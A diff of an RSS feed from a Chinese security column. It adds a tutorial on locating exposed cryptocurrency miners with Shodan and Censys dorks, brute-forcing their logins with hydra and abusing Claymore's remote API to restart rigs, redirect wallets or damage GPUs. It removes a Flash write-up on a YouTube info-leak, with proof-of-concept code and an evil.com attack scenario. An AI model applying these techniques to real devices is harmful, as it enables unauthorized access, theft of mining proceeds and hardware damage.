@@ -5,7 +5,18 @@
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
 <description>twosecurity.io</description>
 <language>zh-cn</language>
-<lastBuildDate>Wed, 25 Oct 2017 09:33:20 +0800</lastBuildDate>
+<lastBuildDate>Tue, 31 Oct 2017 05:32:01 +0800</lastBuildDate>
+<item>
+<title>Hacking Cryptocurrency Miners with OSINT Techniques</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-30-30583233.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Hacking Cryptocurrency Miners with OSINT Techniques&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30583233&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c6a250d6772c007463945761564528a2_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;注意：实验所用的方法可能会对网络产生一定的危害，带来的风险请自行承担。 &lt;/p&gt;&lt;p&gt;Open Source Intelligence（OSINT，开源智能），是在攻击之前收集信息的第一种技术之一。过去也有许多使用 OSINT 攻击的黑客案例。随着 IoT 设备的发展，我们可以在公共网络上收集大量重要信息。本文将以搜集加密货币挖掘设备——挖矿机（比特币 [蚂蚁矿机]和以太坊 [Claymore]）的敏感信息为例。 &lt;/p&gt;&lt;p&gt;许多挖矿机需要连网来发送或者接收数据，这为攻击者提供了可乘之机。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;侦查蚂蚁矿机！ &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;最好的比特币采矿设备是&lt;a href=&quot;https://shop.bitmain.com/antminer_s9_asic_bitcoin_miner.htm?flag=overview&quot;&gt;蚂蚁矿机 &lt;/a&gt;S9 / S7，它的硬件使用了 “lighttpd / 1.4.32” 的 Web 服务器，其中一些开放了 SSH 端口。这儿有一个 “Lighttpd 1.4.31” 的 exploit 。但是，您无法使用此 exploit 攻击服务器。 &lt;/p&gt;&lt;p&gt;Web 服务器上的网页受 “ &lt;a href=&quot;https://en.wikipedia.org/wiki/Digest_access_authentication&quot;&gt;Digest HTTP Authentication （摘要认证）&lt;/a&gt;” 的保护。至关重要的一点是矿机 需要用户名和密码来登录。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5e38d2aed8d8d87cc2ede8d761a65a9a_r.jpg&quot; data-caption=&quot;使用摘要认证的蚂蚁矿机配置页面 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;251&quot;&gt;&lt;p&gt;众所周知，使用 OSINT 收集数据需要一些信息或关键字。这里的关键字是在每次向服务器发送请求时出现在 HTTP 头中的 “antMiner Configuration”（蚂蚁矿机配置信息）。 &lt;/p&gt;&lt;p&gt;我用了下面的语法在 &lt;a href=&quot;http://censys.io/&quot;&gt;censys&lt;/a&gt; 和 &lt;a href=&quot;http://shodan.io/&quot;&gt;shodan&lt;/a&gt; 收集了一些IP地址。 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(antminer) AND protocols.raw: “80/http” AND 80.http.get.title: “401” &lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-40f508941ee186bf725cbf007614d430_r.jpg&quot; data-caption=&quot;censys搜索语法 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;436&quot;&gt;&lt;p&gt;该系统可以通过暴力破解 HTTP 端口或 SSH 端口来访问。 &lt;/p&gt;&lt;p&gt;首先，我需要一个用户指南来得到 HTTP 的默认用户名和密码。之后，我在 Google 上搜索 “antminer default password” （蚂蚁矿机默认密码），并发现了这个“用户指南”。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6dbf832f680a54fc129d2bd4c324b195_r.jpg&quot; data-caption=&quot;AntMiner用户手册&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;562&quot;&gt;&lt;p&gt;对于本教程，我更喜欢使用 &lt;a href=&quot;https://tools.kali.org/password-attacks/hydra&quot;&gt;hydra&lt;/a&gt; 来进行暴力破解（爆破HTTP摘要认证），它使用了&lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords&quot;&gt;最常用的10.000密码&lt;/a&gt;。您也可以使用 &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite&lt;/a&gt; &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;&lt;/a&gt;的 Intruder 功能。 &lt;/p&gt;&lt;p&gt;下面是使用 hydra 的命令： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;hydra -l root -P commonPasswords.txt -vV {TARGET} http-get / &lt;/code&gt;&lt;p&gt;如果你足够幸运，你就可以访问这个配置页面。 &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-165b8a377f9171c8c0ac00292b440c5a_r.jpg&quot; data-caption=&quot;antMiner配置页面 &quot; data-rawwidth=&quot;769&quot; data-rawheight=&quot;585&quot;&gt;&lt;p&gt;攻击者可以任意编辑这个页面。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;Claymore 采矿软件 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;另一种类型的攻击也是针对 &lt;a href=&quot;https://github.com/nanopool/Claymore-Dual-Miner/releases&quot;&gt;Claymore&lt;/a&gt; 这个采矿软件（如 Altcoins，ethereum，zcash miner） &lt;/p&gt;&lt;p&gt;我使用了如下所示语法在 shodan 上搜索了一下： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Dorks: “ETH — Total Speed:” &lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-451dea9797c2418d1207dd1ae7848667_r.jpg&quot; data-caption=&quot; Dorks：“ETH - Total Speed：” &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;368&quot;&gt;&lt;p&gt;您可以通过 Claymore 远程管理  API 发送一些 JSON 数据包来管理采矿服务器。 &lt;/p&gt;&lt;p&gt;在这里，我们用一些命令控制 GPU 的使用模式（禁用，双模式等）或编辑 config.txt 来改变钱包池（pool wallet）的地址 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-49afe80f40aa78b986b5e0ef784f3feb_r.jpg&quot; data-caption=&quot;Claymore远程管理器API.txt &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;463&quot;&gt;&lt;p&gt;我们将发送 “miner_restart” 或 “control_gpu” 命令来检测它是只读还是可写、可读的。我在MAC 系统上使用 NC 发送 JSON 命令。 &lt;/p&gt;&lt;p&gt;首先，我尝试 ” miner_getstat1” 这条指令 &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5a71f4b8a959ea730f0a4720c0e872dc_r.jpg&quot; data-caption=&quot;此代码给出了采矿服务器的统计信息 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;217&quot;&gt;&lt;p&gt;之后，我使用 ” control_gpu” 来探测它是只读还是可读、可写的 &lt;/p&gt;&lt;p&gt;我收到了一个错误代码 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-132db4ab092ebf963725e9e8892476c2_r.jpg&quot; data-caption=&quot;miner服务器具有只读模式 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;656&quot;&gt;&lt;p&gt;我通过不同的 IP 重启了系统，这表明 Claymore 的远程管理 API 允许读和写 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-73899e499741862cd5d8cbd21042c9a4_r.jpg&quot; data-caption=&quot;重启采矿服务器 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;44&quot;&gt;&lt;p&gt;Claymore 远程管理还允许您使用 JSON 格式（发送 json 文件）编辑配置文件。但是，您可以使用 Claymore’s Ethereum Dual Miner  管理工具在 Windows 上轻松编辑，这也可以更改钱包池的地址。 &lt;/p&gt;&lt;p&gt;miner 服务器具有只读模式 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7e0fa6249f4171f347d4129bda5f5024_r.jpg&quot; data-caption=&quot;如果您有读/写权限，可以编辑config.txt &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;529&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3e383fac6a3d38ab7c308b2240acf86d_r.jpg&quot; data-caption=&quot;您可以查看或编辑池的pool’s wallet的地址 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;609&quot;&gt;&lt;h2&gt;&lt;b&gt;攻击设想 :) &lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;我没有通过发送 JSON 命令在 Claymore  采矿软件上尝试命令注入。如果它有漏洞，您可以访问服务器而不需要具备有读写权限。 &lt;/li&gt;&lt;li&gt;您可以使用 OSINT 来改进搜索技巧从而收集大量数据。  &lt;/li&gt;&lt;li&gt;您甚至可以通过在编辑 config.txt 后控制风扇来损坏所有 GPU。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-10-30-30583233</guid>
+<pubDate>Mon, 30 Oct 2017 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>Wiping Out CSRF</title>
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-24-30401930.htm</link>
@@ -613,65 +624,6 @@ title=&quot;[strength]%&quot; /&amp;gt;&lt;/code&gt;&lt;p&gt;我们还注意到�
 <author>Twosecurity</author>
 <guid isPermaLink="false">2017-09-15-29358971</guid>
 <pubDate>Fri, 15 Sep 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>看我如何将 Flash 漏洞死灰复燃（1）</title>
-<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-09-29195210.htm</link>
-<description>&lt;meta charset=&quot;utf-8&quot;&gt;
-&lt;title&gt;看我如何将 Flash 漏洞死灰复燃（1）&lt;/title&gt;
-&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29195210&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Flash 不是一个 Dead App 了吗？&lt;/h2&gt;&lt;p&gt;尽管 Flash 安全的山河日渐衰败，但它依然不可小觑。哪怕是在今年，我也汇报了许多 flash 相关的漏洞给 Facebook，Youtube，WordPress，Yahoo 等公司。在近三年中，我在漏洞奖励项目中至少交了50个 Flash 漏洞。这些漏洞给我带来高达8万刀的奖励。然而这只是冰山一角，Flash 的漏洞远不仅如此。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fe7713ffe1d1548a0a6e1310d07f8d36_r.jpg&quot; data-rawwidth=&quot;300&quot; data-rawheight=&quot;184&quot;&gt;&lt;p&gt;虽然 Flash 在离我们远去，新引进的 javascript/HTML5 却带来新的一波问题。比方说 CORS滥用，由 XHR 或者 postMessage 引发的 DOM XSS。了解 Flash 曾犯下的安全问题有助于我们修补新时代的漏洞。Youtube 最新的 html5 API 就是由 Flash Api 移植的，这无疑值得我们探索。&lt;/p&gt;&lt;p&gt;在余下的篇幅中，我会介绍一些我在 Youtube Flash Api 中找到的精品Flash漏洞。由此引入 html/javascript 的一些安全技巧。&lt;/p&gt;&lt;h2&gt;对 Youtube Flash API 的逆向&lt;/h2&gt;&lt;p&gt;Youtube 的 Flash Api 使用户可以外链它的视频。下图大致描述了其工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;286&quot;&gt;&lt;p&gt;Youtube 的 Wrapper 位于 `youtube.com/v/[VIDEO_ID]` 的一个 Flash 文件。而主程序在 `domain s.ytimg.com`。剩下的模块则负责处理广告、副标题等内容。除了 Flash 到 javascript API，我们还可以发送 `play()`，`pause()` 等命令。Flash 文件会通过类似 ajax 的方式跨域请求视频数据及配置。&lt;/p&gt;&lt;h2&gt;漏洞1：用户信息泄漏&lt;/h2&gt;&lt;p&gt;我们先从一个简单的漏洞入手，这是一段精简过的 Flash ActionScript3 代码：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;public class YoutubeWrapper extends Sprite{
-private var user_name =
-&quot;The Victim&quot;;
-private var user_picture =
-&quot;https://googleusercontent.com/.../victim_photo.jpg&quot;;
-private var appLoader =
-new Loader();
-
-public function
-YoutubeWrapper(){
-// 允许外部js/Flash获取其公开属性
-Security.allowDomain(&quot;*&quot;);
-// 加载主程序
-this.appLoader
-.load(new URLRequest(&quot;https://s.ytimg.com/.../watch_as3.swf&quot;);
-// 将其加入为display container的child
-this.addChild(this.appLoader );
-//
-loaderInfo.sharedEvents Api
-this.loader.contentLoaderInfo.sharedEvents
-.addEventListener(&quot;REQUEST_USERINFO&quot;, this.onRequestUserinfo);
-}
-private function
-onRequestUserinfo(event:Event){
-// 将用户信息写入event.data
-// 我们可以通过 sharedEvents caller 获取它
-event.data.user_name =
-this.user_name;
-event.data.user_image
-= this.user_image;
-}
-}&lt;/code&gt;&lt;p&gt;Youtube Wrapper（包装页面）的属性 “user_name” 包含了谷歌帐号名（在登录了谷歌的情况下）。“user_picture” 则包含了到用户头像的链接。我们是否可以通过某种方法获取这些属性呢？&lt;/p&gt;&lt;p&gt;Youtube Wrapper 能够被开发者的 Flash 文件加载。然而它们都被沙箱政策限制着。&lt;/p&gt;&lt;p&gt;&amp;gt; 在 Flash 中引入外部 Flash 和加载 iframe 类似。如果 iframe 不是同源的，那么它就不能获得父页面的属性。&lt;/p&gt;&lt;p&gt;Youtube Wrapper 包含了 `Security.allowDomain(“*”)`，javascript 便可以向它发送 `play()`、`pause()` 等命令。这意味着在同一个沙箱中，攻击者的Wrapper可以获取任意 Youtube Wrapper 的公开属性。不幸的是，我们并不能获得私有属性。&lt;/p&gt;&lt;p&gt;让我们把目光移向 loaderInfo.sharedEvents，这个 API 允许 Loader 和被加载的文件互相通信。Youtube Wrapper 就用这个 API 和主程序通信。当主程序发送一个事件给 sharedEvent API 时，Youtube Wrapper 会接收该事件并返回 event.data 的信息。&lt;/p&gt;&lt;p&gt;除了 loader 和被加载的文件之外，任何有 loaderInfo 对象 reference（引用）的 Flash 文件都可以调用 loaderInfo.sharedEvents。&lt;/p&gt;&lt;p&gt;&amp;gt; 这个方法类似 postMessage。它们都提供了跨域通信的方式。不仅如此，只要对一个 iframe或者其父页面有 reference，其它窗口也可以调用 postMessage。只要用 window.open 或者window.frames，任意域名都可以访问到 reference。&lt;/p&gt;&lt;p&gt;如果我们可以访问到 loaderInfo 对象，我们就可以窃取用户信息了。可惜的是，loaderInfo 是Youtube Wrapper 的一个私有属性。&lt;/p&gt;&lt;p&gt;不过，当用 Loader 时，我们需要将其添加为 Display Contianer 的 child 以播放被加载的文件。通常来讲，我们会用 `this.addChild(this.loader);` 实现（Youtube Wrapper 也是这么做的）。Youtube Wrapper 还有一个公开的 `getChildAt()` 方法，这个函数会返回 loader 对象。我们可以通过它绕过前面的私有属性限制。&lt;/p&gt;&lt;p&gt;我们可以进一步使用 `YoutubeWrapper.getChildAt(0).loaderInfo.sharedEvents` 发送事件给Youtube。Youtube Wrapper 便会返回 event.data，泄漏隐私大功告成！&lt;/p&gt;&lt;p&gt;PoC：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;var loader = new Loader();
-// 加载Youtube Wrapper
-loader.load(new
-URLRequest(&quot;https://www.youtube.com/v/[VIDEO_ID]&quot;));
-var youtubeWrapper = loader.content;
-// 访问Youtube AppLoader对象
-var appLoader = youtubeWrapper.getChildAt(0);
-// 访问appLoader的loaderInfo.sharedEvents
-var LeakingSharedEvents = appLoader.contentLoaderInfo.sharedEvents;
-// 准备要发给Youtube Wrapper的事件
-var leakEvent = new Event(&quot;Request_username&quot;);
-leakEvent.data = new Object();
-// 发送leakEvent到LeakingSharedEvents
-LeakingSharedEvents.dispatchEvent(leakEvent);
-
-// 现在可以获得用户名和图像了
-trace(leakEvent.data.user_name);
-trace(leakEvent.data.user_picture);&lt;/code&gt;&lt;p&gt;大致工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a10403d51f4083427c26a8e2266857fc_r.png&quot; data-rawwidth=&quot;1358&quot; data-rawheight=&quot;486&quot;&gt;&lt;h2&gt;攻击方案&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;前提条件： 用户安装了 flash 并登录到 Google&lt;/li&gt;&lt;li&gt;1：目标访问攻击者控制的 evil.com/evil.html ，该页面包含了一个恶意 Flash 文件&lt;br&gt;evil.swf&lt;/li&gt;&lt;li&gt;2：evil.swf 加载 Youtube wrapper 并获取目标的用户名。除此之外，还可能通过用户头像的链接来判断出谷歌帐号&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;作者：&lt;b&gt;Enguerran Gillier&lt;/b&gt; ---&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&lt;/a&gt;&lt;/p&gt;</description>
-<author>Twosecurity</author>
-<guid isPermaLink="false">2017-09-09-29195210</guid>
-<pubDate>Sat, 09 Sep 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
